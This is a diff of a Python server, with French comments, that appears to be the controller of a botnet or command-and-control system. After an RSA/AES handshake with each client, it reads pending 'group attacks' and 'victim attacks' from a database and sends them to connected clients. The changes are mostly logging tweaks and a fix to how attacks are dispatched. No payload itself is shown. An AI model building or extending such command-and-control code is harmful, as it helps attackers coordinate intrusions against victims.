@@ -52,7 +52,7 @@ def start_server(port):
 
 
     while running:
-        print("running")
+        print("[+] server is running")
         # print(connection_list)
 
         read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)
@@ -75,7 +75,7 @@ def start_server(port):
                 thread_reception.start()
 
                 # Handshake
-                print("handshake with " + str(addr))
+                print("(+) handshake with " + str(addr))
 
                 # Récupération de la clé publique du client
                 public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
@@ -100,7 +100,7 @@ def start_server(port):
 
                 cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                 pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
-                print("received data : " + str(pt))
+                print("\t(+) config received")
 
                 # Récupération de l'uid client
                 uid = json.loads(pt)["uid"]
@@ -153,17 +153,14 @@ def start_server(port):
         
         # Récupération des attaques de groupe à lancer
         attacks = get_group_attacks(mycursor)
-        # state = "pending", "running", "finished", "error"
-        # query = "SELECT * FROM group_attacks WHERE state = 'pending';"
 
-        # mycursor.execute(query)
-
-        # attacks = mycursor.fetchall()
-
-        # print("ATT : " + str(attacks))
-
+        print("[?] retreiving group attacks")
+        print("\t[+] " + str(len(attacks)) + " attack(s) found")
+        
 
         for attack in attacks:
+            print("[+] executing attack :")
+            print("\t {}", str(attack))
 
             # Récupération des données de l'attaque
             # attack_data = json.loads(attack[4])
@@ -209,12 +206,10 @@ def start_server(port):
 
         # Récupération des attaques individuelles à lancer
         attacks = get_victim_attacks(mycursor)
-        # # state = "pending", "running", "finished", "error"
-        # query = "SELECT * FROM victim_attacks WHERE state = 'pending';"
 
-        # mycursor.execute(query)
-
-        # attacks = mycursor.fetchall()
+        print("[?] retreiving victim attacks")
+        print("\t[+] " + str(len(attacks)) + " attack(s) found")
+        
 
         for attack in attacks:
 
@@ -232,13 +227,16 @@ def start_server(port):
             for victim in victims:
                 victim_uid = victim[0]
                 for client in clients:
-                    execute_attack(client, data)
+                    print("[+] executing victim attack :")
+                    print("\t[+] ", str(attack[2]))
 
-            # Mise à jour de l'attaque
-            query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
-            values = (attack[0], )
+                    execute_attack(client, attack)
 
-            mycursor.execute(query, values)
+                    # Mise à jour de l'attaque
+                    query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
+                    values = (attack[0], )
+
+                    mycursor.execute(query, values)
             
         #######################
             
